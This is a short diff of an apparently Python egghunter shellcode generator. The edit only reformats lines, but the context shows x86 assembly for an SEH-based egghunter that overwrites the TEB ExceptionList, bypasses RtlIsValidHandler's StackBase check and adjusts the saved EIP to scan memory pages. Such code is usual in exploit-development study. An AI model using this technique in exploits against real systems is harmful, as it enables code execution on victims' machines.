@@ -50,7 +50,8 @@ def seh_hunter(tag):
         "push ecx",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
         "push 0xffffffff",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
         "xor ebx, ebx",
-        "mov dword ptr fs:[ebx], esp",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
+        # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
+        "mov dword ptr fs:[ebx], esp",
         # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
         "sub ecx, 0x04",  # substract 0x04 from the pointer to exception_handler
         "add ebx, 0x04",  # add 0x04 to ebx
@@ -71,7 +72,8 @@ def seh_hunter(tag):
         "call build_exception_record",  # call portion of jmp/call/pop
         "push 0x0c",
         "pop ecx",  # store 0x0c in ecx to use as an offset
-        "mov eax, [esp+ecx]",  # mov into eax the pointer to the CONTEXT structure for our exception
+        # mov into eax the pointer to the CONTEXT structure for our exception
+        "mov eax, [esp+ecx]",
         "mov cl, 0xb8",  # mov 0xb8 into ecx which will act as an offset to the eip
         # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
         "add dword ptr ds:[eax+ecx], 0x06",
@@ -86,7 +88,8 @@ def seh_hunter(tag):
 
 def main(args):
 
-    egghunter = ntaccess_hunter(args.tag) if not args.seh else seh_hunter(args.tag)
+    egghunter = ntaccess_hunter(
+        args.tag) if not args.seh else seh_hunter(args.tag)
 
     eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
     if args.seh:
